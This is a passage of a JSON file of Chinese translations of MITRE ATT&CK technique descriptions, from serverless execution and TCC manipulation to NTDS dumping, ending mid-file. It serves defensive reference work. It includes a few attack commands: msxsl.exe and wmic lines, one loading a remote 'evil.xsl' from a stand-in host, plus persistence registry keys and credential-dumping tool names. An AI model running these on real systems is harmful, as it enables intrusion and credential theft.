UNC2452白皮书)\n\n这可能用于持久威胁事件以及BEC（商业电子邮件入侵）事件，其中攻击者可以向他们希望入侵的帐户添加[额外的云角色](https://attack.mitre.org/techniques/T1098/003)。这可能进一步启用其他技术以获取系统访问权限。例如，受入侵的业务帐户通常用于向目标业务网络中的其他帐户发送消息，同时创建收件箱规则（例如：[内部鱼叉式钓鱼](https://attack.mitre.org/techniques/T1534)），以便消息规避垃圾邮件/钓鱼检测机制。(引用: Bienstock, D. - 防御O365 - 2019)"
    },
    "Serverless Execution": {
        "translated_name": "无服务器执行",
        "translated_description": "攻击者可能滥用无服务器计算、集成和自动化服务在云环境中执行任意代码。许多云提供商提供各种无服务器资源，包括计算引擎、应用程序集成服务和Web服务器。\n\n攻击者可能以各种方式滥用这些资源作为执行任意命令的手段。例如，攻击者可能使用无服务器函数执行恶意代码，例如加密挖矿恶意软件（即[资源劫持](https://attack.mitre.org/techniques/T1496)）。(引用: Cado Security Denonia) 攻击者还可能创建能够进一步破坏云环境的函数。例如，攻击者可能使用AWS中的`IAM:PassRole`权限或Google Cloud中的`iam.serviceAccounts.actAs`权限向无服务器云函数添加[额外的云角色](https://attack.mitre.org/techniques/T1098/003)，然后该函数可能能够执行原始用户无法执行的操作。(引用: Rhino Security Labs AWS权限提升)(引用: Rhingo Security Labs GCP权限提升)\n\n无服务器函数还可以响应云事件（即[事件触发执行](https://attack.mitre.org/techniques/T1546)）调用，可能在一段时间内实现持久执行。例如，在AWS环境中，攻击者可能创建一个Lambda函数，该函数在创建新用户时自动向用户添加[额外的云凭据](https://attack.mitre.org/techniques/T1098/001)，并创建一个相应的CloudWatch事件规则，该规则在创建新用户时调用该函数。(引用: 入侵AWS帐户) 这在许多基于云的办公应用程序套件中也是可能的。例如，在Microsoft 365环境中，攻击者可能创建一个Power Automate工作流，该工作流在用户被授予访问SharePoint中的文档时转发用户收到的所有电子邮件或创建匿名共享链接。(引用: Varonis Power Automate数据外泄)(引用: Microsoft DART案例报告001) 在Google Workspace环境中，他们可能创建一个Apps Script，在用户打开文件时外泄用户的数据。(引用: Cloud Hack Tricks GWS Apps Script)(引用: OWN-CERT Google App Script 2024)"
    },
    "TCC Manipulation": {
        "translated_name": "TCC操纵",
        "translated_description": "攻击者可以操纵或滥用透明度、同意和控制（TCC）服务或数据库，以授予恶意可执行文件提升的权限。TCC是macOS的隐私和安全控制机制，用于确定正在运行的进程是否有权访问受TCC保护的数据或服务，例如屏幕共享、摄像头、麦克风或全磁盘访问（FDA）。\n\n当应用程序请求访问受TCC保护的数据或服务时，TCC守护进程（`tccd`）会检查位于`/Library/Application Support/com.apple.TCC/TCC.db`（和`~/`等效）的TCC数据库，并覆盖文件（如果连接到MDM）以获取现有权限。如果权限不存在，则会提示用户授予权限。一旦授予权限，数据库将存储应用程序的权限，并且除非重置，否则不会再次提示用户。例如，当Web浏览器请求访问用户的网络摄像头时，一旦授予权限，Web浏览器可能不会再次明确提示用户。(引用: welivesecurity TCC)\n\n攻击者可能通过滥用先前通过[进程注入](https://attack.mitre.org/techniques/T1055)授予权限的应用程序或使用另一个应用程序执行恶意二进制文件来访问受TCC保护的受限数据或服务。例如，攻击者可以使用具有FDA权限的macOS本机应用程序Finder来执行恶意的[AppleScript](https://attack.mitre.org/techniques/T1059/002)。当在Finder应用程序下执行时，恶意的[AppleScript](https://attack.mitre.org/techniques/T1059/002)继承了对系统上所有文件的访问权限，而无需用户提示。当系统完整性保护（SIP）被禁用时，TCC保护也被禁用。对于未启用SIP的系统，攻击者可以通过使用环境变量和[Launchctl](https://attack.mitre.org/techniques/T1569/001)加载攻击者控制的TCC数据库来操纵TCC数据库，以向其恶意可执行文件添加权限。(引用: TCC macOS绕过)(引用: TCC数据库)"
    },
    "Ptrace System Calls": {
        "translated_name": "Ptrace系统调用",
        "translated_description": "攻击者可能通过ptrace（进程跟踪）系统调用将恶意代码注入进程，以规避基于进程的防御并可能提升权限。Ptrace系统调用注入是一种在独立活动进程的地址空间中执行任意代码的方法。\n\nPtrace系统调用注入涉及附加并修改正在运行的进程。Ptrace系统调用使调试进程能够观察和控制另一个进程（以及每个单独的线程），包括更改内存和寄存器值。(引用: PTRACE手册) Ptrace系统调用注入通常通过将任意代码写入正在运行的进程（例如<code>malloc</code>）然后使用<code>PTRACE_SETREGS</code>调用该内存来设置包含下一条指令的寄存器来执行。Ptrace系统调用注入也可以使用<code>PTRACE_POKETEXT</code>/<code>PTRACE_POKEDATA</code>完成，这些操作将数据复制到目标进程内存中的特定地址（例如下一条指令的当前地址）。(引用: PTRACE手册)(引用: Medium Ptrace 2018年7月)\n\nPtrace系统调用注入可能无法针对非子进程和/或具有更高权限的进程。(引用: BH Linux注入)\n\n在另一个进程的上下文中运行代码可能允许访问该进程的内存、系统/网络资源，并可能提升权限。通过ptrace系统调用注入执行还可能规避安全产品的检测，因为执行被掩盖在合法进程下。"
    },
    "Power Settings": {
        "translated_name": "电源设置",
        "translated_description": "攻击者可能会削弱系统的休眠、重启或关闭能力，以延长对受感染机器的访问。当计算机进入休眠状态时，部分或所有软件和硬件可能会停止运行，这可能会中断恶意活动。(引用: 睡眠、关闭、休眠)\n\n攻击者可能滥用系统实用程序和配置设置，通过防止机器进入可以终止恶意活动的状态（如待机）来保持访问。(引用: Microsoft: Powercfg命令行选项)(引用: systemdsleep Linux)\n\n例如，`powercfg`控制Windows系统上所有可配置的电源系统设置，并可能被滥用以防止受感染的主机锁定或关闭。(引用: 两种新的Monero恶意软件攻击针对Windows和Android用户) 攻击者还可能延长系统锁屏超时设置。(引用: BATLOADER: 规避的下载器恶意软件) 其他相关设置（如磁盘和休眠超时）也可能被滥用以保持受感染的机器运行，即使没有用户活动。(引用: CoinLoader: 复杂的恶意软件加载器活动)\n\n意识到某些恶意软件无法在系统重启后存活，攻击者可能会完全删除用于调用系统关闭或重启的文件。(引用: Condi-Botnet-binaries)"
    },
    "Dynamic API Resolution": {
        "translated_name": "动态API解析",
        "translated_description": "攻击者可能会混淆然后动态解析其恶意软件调用的API函数，以隐藏恶意功能并阻碍防御分析。恶意软件通常使用操作系统提供的各种[Native API](https://attack.mitre.org/techniques/T1106)函数来执行各种任务，例如涉及进程、文件和其他系统工件的任务。\n\n恶意软件调用的API函数可能会在负载文件中留下静态工件，例如字符串。防御分析师还可能通过导入地址表（IAT）或其他帮助动态链接调用代码到提供函数的共享模块的结构来揭示二进制文件可能执行的函数。(引用: Huntress API哈希)(引用: IRED API哈希)\n\n为了避免静态或其他防御分析，攻击者可能使用动态API解析来隐藏恶意软件的特征和功能。类似于[软件打包](https://attack.mitre.org/techniques/T1027/002)，动态API解析可能会更改文件签名并混淆恶意API函数调用，直到它们在运行时被解析和调用。\n\n可以使用各种方法来混淆恶意软件对API函数的调用。例如，函数名称的哈希通常存储在恶意软件中，而不是字面字符串。恶意软件可以使用这些哈希（或其他标识符）手动复制链接和加载过程，使用`GetProcAddress()`和`LoadLibrary()`等函数。这些哈希/标识符还可以通过加密或其他字符串操作技巧进一步混淆（需要在执行期间进行各种形式的[反混淆/解码文件或信息](https://attack.mitre.org/techniques/T1140)）。(引用: BlackHat API打包器)(引用: Drakonia HInvoke)(引用: Huntress API哈希)"
    },
    "Remote Desktop Protocol": {
        "translated_name": "远程桌面协议",
        "translated_description": "攻击者可能使用[有效帐户](https://attack.mitre.org/techniques/T1078)通过远程桌面协议（RDP）登录计算机。攻击者随后可以以登录用户的身份执行操作。\n\n远程桌面是操作系统中的常见功能。它允许用户登录到远程系统的桌面图形用户界面的交互会话。Microsoft将其远程桌面协议（RDP）的实现称为远程桌面服务（RDS）。(引用: TechNet远程桌面服务)\n\n如果服务已启用并允许使用已知凭据的帐户访问，攻击者可能通过RDP/RDS连接到远程系统以扩展访问权限。攻击者可能会使用凭据访问技术来获取用于RDP的凭据。攻击者还可能将RDP与[辅助功能](https://attack.mitre.org/techniques/T1546/008)或[终端服务DLL](https://attack.mitre.org/techniques/T1505/005)结合使用以实现持久性。(引用: Alperovitch恶意软件)"
    },
    "Logon Script (Windows)": {
        "translated_name": "登录脚本（Windows）",
        "translated_description": "攻击者可能使用在登录初始化时自动执行的Windows登录脚本来建立持久性。Windows允许在特定用户或用户组登录系统时运行登录脚本。(引用: TechNet登录脚本) 这是通过将脚本路径添加到<code>HKCU\\Environment\\UserInitMprLogonScript</code>注册表项来完成的。(引用: Hexacorn登录脚本)\n\n攻击者可能使用这些脚本在单个系统上保持持久性。根据登录脚本的访问配置，可能需要本地凭据或管理员帐户。"
    },
    "ListPlanting": {
        "translated_name": "列表植入",
        "translated_description": "攻击者可能滥用列表视图控件将恶意代码注入到被劫持的进程中，以规避基于进程的防御并可能提升权限。列表植入是一种在独立活动进程的地址空间中执行任意代码的方法。(引用: Hexacorn列表植入) 通过列表植入执行的代码还可能规避安全产品的检测，因为执行被掩盖在合法进程下。\n\n列表视图控件是用于显示项目集合的用户界面窗口。(引用: Microsoft列表视图控件) 有关应用程序列表视图设置的信息存储在进程内存中的<code>SysListView32</code>控件中。\n\n列表植入（一种消息传递“碎片攻击”）可以通过将代码复制到使用列表视图控件的进程的虚拟地址空间，然后使用该代码作为自定义回调来对列出的项目进行排序来执行。(引用: Modexp Windows进程注入) 攻击者必须首先将代码复制到目标进程的内存空间中，这可以通过直接获取受害者进程窗口的<code>SysListView32</code>子句柄（通过Windows API调用，如<code>FindWindow</code>和/或<code>EnumWindows</code>）或其他[进程注入](https://attack.mitre.org/techniques/T1055)方法来完成。\n\n某些列表植入的变体可能会在目标进程中分配内存，但随后使用窗口消息复制有效负载，以避免使用高度监控的<code>WriteProcessMemory</code>函数。例如，攻击者可以使用<code>PostMessage</code>和/或<code>SendMessage</code> API函数发送<code>LVM_SETITEMPOSITION</code>和<code>LVM_GETITEMPOSITION</code>消息，有效地将有效负载每次2字节复制到分配的内存中。(引用: ESET InvisiMole 2020年6月)\n\n最后，通过向进程窗口的<code>SysListView32</code>子句发送<code>LVM_SORTITEMS</code>消息来触发有效负载，并将新分配的缓冲区中的有效负载作为<code>ListView_SortItems</code>回调传递并执行。"
    },
    "Hide Infrastructure": {
        "translated_name": "隐藏基础设施",
        "translated_description": "对手可能会操纵网络流量，以隐藏和规避其C2基础设施的检测。这可以通过各种方式实现，包括识别和过滤来自防御工具的流量，(引用: TA571) 掩盖恶意域名以混淆自动扫描工具和安全研究人员的真实目的地，(引用: Schema-abuse)(引用: Facad1ng)(引用: Browser-updates) 以及隐藏恶意工件以延迟发现并延长对手基础设施的有效性，否则这些基础设施可能会被识别、阻止或完全关闭。\n\nC2网络可能包括使用[代理](https://attack.mitre.org/techniques/T1090)或VPN来伪装IP地址，这可以使对手与正常网络流量混合，并绕过条件访问策略或反滥用保护。例如，对手可能使用虚拟私有云来伪造其IP地址，以更接近受害者的IP地址范围。这也可能绕过依赖源IP地址地理位置的安全措施。(引用: sysdig)(引用: Orange Residential Proxies)\n\n对手还可能尝试通过多种方式过滤网络流量，以规避防御工具，包括阻止/重定向常见的事件响应者或安全设备用户代理。(引用: mod_rewrite)(引用: SocGholish-update) 基于IP和地理围栏的流量过滤也可能避免自动沙箱或研究人员活动（即[虚拟化/沙箱规避](https://attack.mitre.org/techniques/T1497)）。(引用: TA571)(引用: mod_rewrite)\n\n隐藏C2基础设施还可能通过[资源开发](https://attack.mitre.org/tactics/TA0042)活动（如[获取基础设施](https://attack.mitre.org/techniques/T1583)和[破坏基础设施](https://attack.mitre.org/techniques/T1584)）得到支持。例如，使用广泛信任的托管服务或域名（如知名URL缩短提供商或营销服务）进行C2网络可能使对手能够呈现良性内容，一旦满足特定条件，受害者将被重定向到恶意网页或基础设施。(引用: StarBlizzard)(引用: QR-cofense)"
    },
    "Domain or Tenant Policy Modification": {
        "translated_name": "域或租户策略修改",
        "translated_description": "攻击者可能会修改域或身份租户的配置设置，以在集中管理环境中规避防御和/或提升权限。此类服务提供了集中管理身份资源（如设备和账户）的手段，通常包括适用于域或租户之间的配置设置，如信任关系、身份同步或身份联合。\n\n对域或租户设置的修改可能包括更改Microsoft Active Directory (AD)中的域组策略对象（GPO）或更改域的信任设置，包括域或租户之间的联合信任关系。\n\n拥有足够权限的攻击者可以修改域或租户策略设置。由于这些服务的配置设置适用于大量身份资源，因此滥用此功能可能导致大量潜在的攻击和恶意后果。此类滥用的示例包括：\n\n* 修改GPO以将恶意[计划任务](https://attack.mitre.org/techniques/T1053/005)推送到整个域环境中的计算机（引用：ADSecurity GPO Persistence 2016）（引用：Wald0 Guide to GPOs）（引用：Harmj0y Abusing GPO Permissions）\n* 修改域信任以包含攻击者控制的域，允许攻击者伪造访问令牌，随后被受害域资源接受（引用：Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks）\n* 更改AD环境中的配置设置以实施[恶意域控制器](https://attack.mitre.org/techniques/T1207)。\n* 向身份租户添加新的攻击者控制的联合身份提供者，允许攻击者以受害租户管理的任何用户身份进行身份验证（引用：Okta Cross-Tenant Impersonation 2023）\n\n攻击者可能会临时修改域或租户策略，执行恶意操作，然后恢复更改以删除可疑迹象。"
    },
    "XSL Script Processing": {
        "translated_name": "XSL脚本处理",
        "translated_description": "攻击者可能通过在XSL文件中嵌入脚本来绕过应用程序控制并隐藏代码执行。可扩展样式表语言（XSL）文件通常用于描述XML文件中的数据处理和呈现。为了支持复杂操作，XSL标准包括对嵌入多种语言脚本的支持。（引用：Microsoft XSLT Script Mar 2017）\n\n攻击者可能滥用此功能来执行任意文件，同时可能绕过应用程序控制。类似于[受信任的开发人员实用程序代理执行](https://attack.mitre.org/techniques/T1127)，Microsoft命令行转换实用程序二进制文件（msxsl.exe）（引用：Microsoft msxsl.exe）可以安装并用于执行嵌入在本地或远程（URL引用）XSL文件中的恶意JavaScript。（引用：Penetration Testing Lab MSXSL July 2017）由于msxsl.exe默认未安装，攻击者可能需要将其与丢弃的文件一起打包。（引用：Reaqta MSXSL Spearphishing MAR 2018）Msxsl.exe接受两个主要参数，一个XML源文件和一个XSL样式表。由于XSL文件是有效的XML，攻击者可能会两次调用相同的XSL文件。使用msxsl.exe时，攻击者还可能为XML/XSL文件指定任意文件扩展名。（引用：XSL Bypass Mar 2019）\n\n命令行示例：（引用：Penetration Testing Lab MSXSL July 2017）（引用：XSL Bypass Mar 2019）\n\n* <code>msxsl.exe customers[.]xml script[.]xsl</code>\n* <code>msxsl.exe script[.]xsl script[.]xsl</code>\n* <code>msxsl.exe script[.]jpeg script[.]jpeg</code>\n\n此技术的另一种变体称为“Squiblytwo”，涉及使用[Windows管理工具](https://attack.mitre.org/techniques/T1047)在XSL文件中调用JScript或VBScript。（引用：LOLBAS Wmic）此技术还可以执行本地/远程脚本，并且类似于其[Regsvr32](https://attack.mitre.org/techniques/T1218/010)/“Squiblydoo”对应物，利用受信任的内置Windows工具。攻击者可能滥用[Windows管理工具](https://attack.mitre.org/techniques/T1047)中的任何别名，只要他们使用/FORMAT开关。（引用：XSL Bypass Mar 2019）\n\n命令行示例：（引用：XSL Bypass Mar 2019）（引用：LOLBAS Wmic）\n\n* 本地文件：<code>wmic process list /FORMAT:evil[.]xsl</code>\n* 远程文件：<code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>"
    },
    "Scan Databases": {
        "translated_name": "扫描数据库",
        "translated_description": "攻击者可能会在公共扫描数据库中搜索有关受害者的信息，以便在目标定位期间使用。各种在线服务持续发布互联网扫描/调查的结果，通常收集诸如活动IP地址、主机名、开放端口、证书甚至服务器横幅等信息。（引用：Shodan）\n\n攻击者可能会搜索扫描数据库以收集可操作的信息。威胁行为者可以使用在线资源和查找工具从这些服务中收集信息。攻击者可能会寻找有关他们已经识别的目标的信息，或使用这些数据集来发现成功入侵的机会。来自这些来源的信息可能揭示其他形式的侦察机会（例如：[主动扫描](https://attack.mitre.org/techniques/T1595)或[搜索开放网站/域名](https://attack.mitre.org/techniques/T1593)），建立操作资源（例如：[开发能力](https://attack.mitre.org/techniques/T1587)或[获取能力](https://attack.mitre.org/techniques/T1588)），和/或初始访问（例如：[外部远程服务](https://attack.mitre.org/techniques/T1133)或[利用面向公众的应用程序](https://attack.mitre.org/techniques/T1190)）。"
    },
    "Hidden Files and Directories": {
        "translated_name": "隐藏文件和目录",
        "translated_description": "攻击者可能会将文件和目录设置为隐藏，以规避检测机制。为了防止普通用户意外更改系统上的特殊文件，大多数操作系统都有“隐藏”文件的概念。当用户使用GUI浏览文件系统或使用命令行上的普通命令时，这些文件不会显示。用户必须通过一系列图形用户界面（GUI）提示或命令行开关（Windows的<code>dir /a</code>和Linux及macOS的<code>ls –a</code>）明确要求显示隐藏文件。\n\n在Linux和Mac上，用户可以通过在文件或文件夹名称的第一个字符处放置“.”来将特定文件标记为隐藏（引用：Sofacy Komplex Trojan）（引用：Antiquated Mac Malware）。以“.”开头的文件和文件夹默认在Finder应用程序和标准命令行实用程序（如“ls”）中不可见。用户必须专门更改设置才能使这些文件可见。\n\nmacOS上的文件也可以标记为UF_HIDDEN标志，这可以防止它们在Finder.app中可见，但仍然允许它们在Terminal.app中可见（引用：WireLurker）。在Windows上，用户可以使用attrib.exe二进制文件将特定文件标记为隐藏。许多应用程序创建这些隐藏文件和文件夹以存储信息，以免杂乱用户的 workspace。例如，SSH实用程序创建一个隐藏的.ssh文件夹，其中包含用户的已知主机和密钥。\n\n攻击者可以利用这一点来隐藏系统上的任何文件和文件夹，并规避不包含隐藏文件调查的典型用户或系统分析。"
    },
    "Create Snapshot": {
        "translated_name": "创建快照",
        "translated_description": "攻击者可能会在云账户中创建快照或数据备份以规避防御。快照是现有云计算组件（如虚拟机（VM）、虚拟硬盘或卷）的时间点副本。攻击者可能会利用权限创建快照，以绕过阻止访问现有计算服务基础设施的限制，这与[恢复云实例](https://attack.mitre.org/techniques/T1578/004)不同，在后者中，攻击者可能会恢复到快照以规避检测并删除其存在的证据。\n\n攻击者可能会[创建云实例](https://attack.mitre.org/techniques/T1578/002)，将一个或多个创建的快照挂载到该实例，然后应用允许攻击者访问所创建实例的策略，例如允许其入站和出站SSH访问的防火墙策略。（引用：Mandiant M-Trends 2020）"
    },
    "Determine Physical Locations": {
        "translated_name": "确定物理位置",
        "translated_description": "攻击者可能会收集受害者的物理位置信息，以便在目标定位期间使用。有关目标组织物理位置的信息可能包括各种细节，包括关键资源和基础设施的位置。物理位置还可能表明受害者运营所在的法律管辖区和/或当局。\n\n攻击者可能通过各种方式收集此信息，例如通过[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)直接获取。目标组织的物理位置也可能通过在线或其他可访问的数据集暴露给攻击者（例如：[搜索受害者拥有的网站](https://attack.mitre.org/techniques/T1594)或[社交媒体](https://attack.mitre.org/techniques/T1593/001)）。（引用：ThreatPost Broadvoice Leak）（引用：SEC EDGAR Search）收集此信息可能揭示其他形式的侦察机会（例如：[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)或[搜索开放网站/域名](https://attack.mitre.org/techniques/T1593)），建立操作资源（例如：[开发能力](https://attack.mitre.org/techniques/T1587)或[获取能力](https://attack.mitre.org/techniques/T1588)），和/或初始访问（例如：[钓鱼](https://attack.mitre.org/techniques/T1566)或[硬件添加](https://attack.mitre.org/techniques/T1200)）。"
    },
    "Office Test": {
        "translated_name": "Office测试",
        "translated_description": "攻击者可能滥用Microsoft Office的“Office Test”注册表项以在受感染系统上获得持久性。存在一个Office Test注册表位置，允许用户指定一个任意DLL，该DLL将在每次启动Office应用程序时执行。此注册表项被认为是Microsoft在开发Office应用程序时用于加载DLL以进行测试和调试的。此注册表项在Office安装期间默认不会创建。（引用：Hexacorn Office Test）（引用：Palo Alto Office Test Sofacy）\n\n存在用户和全局的Office Test功能注册表项，例如：\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Office test\\Special\\Perf</code>\n\n攻击者可能会添加此注册表项并指定一个恶意DLL，该DLL将在每次启动Office应用程序（如Word或Excel）时执行。"
    },
    "Develop Capabilities": {
        "translated_name": "开发能力",
        "translated_description": "攻击者可能会构建可用于目标定位的能力。与其购买、免费下载或窃取能力，攻击者可能会在内部开发自己的能力。这是识别开发需求并构建解决方案（如恶意软件、漏洞利用和自签名证书）的过程。攻击者可能会开发能力以支持其在攻击生命周期的多个阶段中的操作。（引用：Mandiant APT1）（引用：Kaspersky Sofacy）（引用：Bitdefender StrongPity June 2020）（引用：Talos Promethium June 2020）\n\n与合法的开发工作一样，开发能力可能需要不同的技能。所需的技能可能在内部，也可能需要外包。使用承包商可能被视为该攻击者开发能力的延伸，前提是攻击者在塑造需求方面发挥作用并保持对该能力的某种程度的独占性。"
    },
    "NTDS": {
        "translated_name": "NTDS",
        "translated_description": "攻击者可能会尝试访问或创建Active Directory域数据库的副本，以窃取凭据信息，以及获取有关域成员的其他信息，如设备、用户和访问权限。默认情况下，NTDS文件（NTDS.dit）位于域控制器的<code>%SystemRoot%\\NTDS\\Ntds.dit</code>中。（引用：Wikipedia Active Directory）\n\n除了在活动域控制器上查找NTDS文件外，攻击者还可能搜索包含相同或类似信息的备份。（引用：Metcalf 2015）\n\n以下工具和技术可用于枚举NTDS文件以及整个Active Directory哈希的内容。\n\n* 卷影副本\n* secretsdump.py\n* 使用内置的Windows工具ntdsutil.exe\n* Invoke-NinjaCopy\n"
    },
    "SNMP (MIB Dump)": {
        "translated_name": "SNMP（MIB转储）",
        "translated_description": "攻击者可能会针对管理信息库（MIB）以收集和/或挖掘在使用简单网络管理协议（SNMP）管理的网络中的有价值信息。\n\nMIB是一个配置存储库，存储通过SNMP访问的变量信息，形式为对象标识符（OID）。每个OID标识一个可以读取或设置的变量，并允许通过远程修改这些变量来执行主动管理任务，如配置更改。SNMP可以为管理员提供对其系统的深入了解，例如系统信息、硬件描述、物理位置和软件包（引用：SANS Information Security Reading Room Securing SNMP Securing SNMP）。MIB还可能包含设备操作信息，包括运行配置、路由表和接口详细信息。\n\n攻击者可能使用SNMP查询直接从SNMP管理的设备收集MIB内容，以收集允许攻击者构建网络地图并促进未来定向利用的网络信息。（引用：US-CERT-TA18-106A）（引用：Cisco Blog Legacy Device Attacks）"
    },
    "Malicious Link": {
        "translated_name": "恶意链接",
        "translated_description": "攻击者可能依赖用户点击恶意链接以获得执行。用户可能会受到社会工程学的攻击，诱使他们点击导致代码执行的链接。此用户操作通常会被视为[钓鱼链接](https://attack.mitre.org/techniques/T1566/002)的后续行为。点击链接还可能导致其他执行技术，例如通过[客户端执行漏洞利用](https://attack.mitre.org/techniques/T1203)利用浏览器或应用程序漏洞。链接还可能导致用户下载需要通过[恶意文件](https://attack.mitre.org/techniques/T1204/002)执行的文件。"
    },
    "Application Access Token": {
        "translated_name": "应用程序访问令牌",
        "translated_description": "攻击者可能使用窃取的应用程序访问令牌来绕过典型的身份验证过程，并访问远程系统上的受限账户、信息或服务。这些令牌通常从用户或服务中窃取，并用于替代登录凭证。\n\n应用程序访问令牌用于代表用户或服务进行授权的API请求，通常用于访问云、基于容器的应用程序和软件即服务（SaaS）中的资源。(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) \n\nOAuth 是一种常见的框架，用于向用户发放访问系统的令牌。这些框架协同工作以验证用户身份并确定用户允许执行的操作。一旦身份验证完成，令牌允许授权操作，而无需传递用户的实际凭证。因此，令牌的泄露可能使攻击者通过恶意应用程序访问其他站点的资源。(Citation: okta)\n\n例如，对于基于云的电子邮件服务，一旦OAuth访问令牌被授予恶意应用程序，如果授予了启用后台访问的“刷新”令牌，它可能会长期访问用户账户的功能。(Citation: Microsoft Identity Platform Access 2019) 通过OAuth访问令牌，攻击者可以使用用户授予的REST API执行诸如电子邮件搜索和联系人枚举等功能。(Citation: Staaldraad Phishing with OAuth 2017)\n\n泄露的访问令牌可能被用作入侵其他服务的初始步骤。例如，如果令牌授予了对受害者主要电子邮件的访问权限，攻击者可能能够通过触发忘记密码流程扩展到目标订阅的所有其他服务。在AWS和GCP环境中，攻击者可以触发请求具有另一个用户账户权限的短期访问令牌。(Citation: Google Cloud Service Account Credentials)(Citation: AWS Temporary Security Credentials) 攻击者随后可以使用此令牌请求数据或执行原始账户无法执行的操作。如果此功能的权限配置错误——例如，允许所有用户请求特定账户的令牌——攻击者可能能够获得对云账户的初始访问权限或提升其权限。(Citation: Rhino Security Labs Enumerating AWS Roles)\n\n通过令牌直接访问API会削弱第二重身份验证的有效性，并且可能对直观的防御措施（如更改密码）免疫。例如，在AWS环境中，攻击者如果泄露了用户的AWS API凭证，可能能够使用`sts:GetFederationToken` API调用创建联合用户会话，该会话将具有与原始用户相同的权限，但即使原始用户凭证被停用，该会话也可能持续存在。(Citation: Crowdstrike AWS User Federation Persistence) 此外，通过API通道的滥用访问可能难以从服务提供商端检测到，因为访问仍然可能与合法的工作流程很好地吻合。"
    },
    "LSASS Driver": {
        "translated_name": "LSASS驱动程序",
        "translated_description": "攻击者可能修改或添加LSASS驱动程序以在受感染的系统上获得持久性。Windows安全子系统是一组管理和强制执行计算机或域安全策略的组件。本地安全机构（LSA）是负责本地安全策略和用户身份验证的主要组件。LSA包括与各种其他安全功能相关的多个动态链接库（DLL），所有这些都在LSA子系统服务（LSASS）lsass.exe进程的上下文中运行。(Citation: Microsoft Security Subsystem)\n\n攻击者可能针对LSASS驱动程序以获得持久性。通过替换或添加非法驱动程序（例如，[Hijack Execution Flow](https://attack.mitre.org/techniques/T1574)），攻击者可以使用LSA操作持续执行恶意负载。"
    },
    "Service Execution": {
        "translated_name": "服务执行",
        "translated_description": "攻击者可能滥用Windows服务控制管理器来执行恶意命令或负载。Windows服务控制管理器（<code>services.exe</code>）是管理和操作服务的接口。(Citation: Microsoft Service Control Manager) 服务控制管理器可通过GUI组件以及系统实用程序（如<code>sc.exe</code>和[Net](https://attack.mitre.org/software/S0039)）访问。\n\n[PsExec](https://attack.mitre.org/software/S0029) 也可用于通过服务控制管理器API创建的临时Windows服务执行命令或负载。(Citation: Russinovich Sysinternals) 诸如[PsExec](https://attack.mitre.org/software/S0029)和<code>sc.exe</code>之类的工具可以接受远程服务器作为参数，并可用于进行远程执行。\n\n攻击者可能利用这些机制执行恶意内容。这可以通过执行新的或修改的服务来完成。此技术与[Windows服务](https://attack.mitre.org/techniques/T1543/003)在服务持久性或权限提升期间结合使用。"
    },
    "Environmental Keying": {
        "translated_name": "环境密钥",
        "translated_description": "攻击者可能通过环境密钥来约束恶意软件的执行或功能，以逃避防御并将执行限制在特定的目标环境中。环境密钥使用加密技术来约束执行或操作，基于攻击者提供的特定环境条件，这些条件预计会出现在目标环境中。环境密钥是[执行护栏](https://attack.mitre.org/techniques/T1480)的一种实现，利用加密技术从给定计算环境中的特定类型的值派生加密/解密密钥。(Citation: EK Clueless Agents)\n\n可以从目标特定的元素派生值，并用于生成解密密钥以解密加密的负载。目标特定的值可以从特定的网络共享、物理设备、软件/软件版本、文件、加入的AD域、系统时间以及本地/外部IP地址派生。(Citation: Kaspersky Gauss Whitepaper)(Citation: Proofpoint Router Malvertising)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware) 通过从目标特定的环境值生成解密密钥，环境密钥可以使沙箱检测、反病毒检测、信息众包和逆向工程变得困难。(Citation: Kaspersky Gauss Whitepaper)(Citation: Ebowla: Genetic Malware) 这些困难可能会减慢事件响应过程，并帮助攻击者隐藏其战术、技术和程序（TTP）。\n\n类似于[混淆文件或信息](https://attack.mitre.org/techniques/T1027)，攻击者可能使用环境密钥来保护其TTP并逃避检测。环境密钥可用于向目标传递加密负载，该负载将使用目标特定的值在执行前解密负载。(Citation: Kaspersky Gauss Whitepaper)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware)(Citation: Demiguise Guardrail Router Logo) 通过利用目标特定的值来解密负载，攻击者可以避免将解密密钥与负载打包或通过可能受监控的网络连接发送。根据收集目标特定值的技术，加密负载的逆向工程可能异常困难。(Citation: Kaspersky Gauss Whitepaper) 这可以用于防止在不打算被入侵或操作的环境中暴露能力。\n\n与其他[执行护栏](https://attack.mitre.org/techniques/T1480)一样，环境密钥可用于防止在不打算被入侵或操作的环境中暴露能力。此活动与典型的[虚拟化/沙箱逃避](https://attack.mitre.org/techniques/T1497)不同。虽然使用[虚拟化/沙箱逃避](https://attack.mitre.org/techniques/T1497)可能涉及检查已知的沙箱值并在没有匹配的情况下继续执行，但使用环境密钥将涉及检查预期的目标特定值，该值必须匹配才能成功解密并随后执行。"
    },
    "Fallback Channels": {
        "translated_name": "备用通道",
        "translated_description": "如果主要通道被破坏或无法访问，攻击者可能使用备用或替代通信通道，以维持可靠的命令和控制，并避免数据传输阈值。"
    },
    "NTFS File Attributes": {
        "translated_name": "NTFS文件属性",
        "translated_description": "攻击者可能使用NTFS文件属性隐藏其恶意数据，以逃避检测。每个NTFS格式的分区都包含一个主文件表（MFT），该表维护分区上每个文件/目录的记录。(Citation: SpectorOps Host-Based Jul 2017) 在MFT条目中，文件属性（如扩展属性（EA）和数据[当存在多个数据属性时称为备用数据流（ADS）]）可用于存储任意数据（甚至完整的文件）。(Citation: SpectorOps Host-Based Jul 2017) (Citation: Microsoft NTFS File Attributes Aug 2010) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)\n\n攻击者可能将恶意数据或二进制文件存储在文件属性元数据中，而不是直接存储在文件中。这可能是为了逃避某些防御措施，如静态指示符扫描工具和反病毒软件。(Citation: Journey into IR ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015)"
    },
    "Kerberoasting": {
        "translated_name": "Kerberoasting",
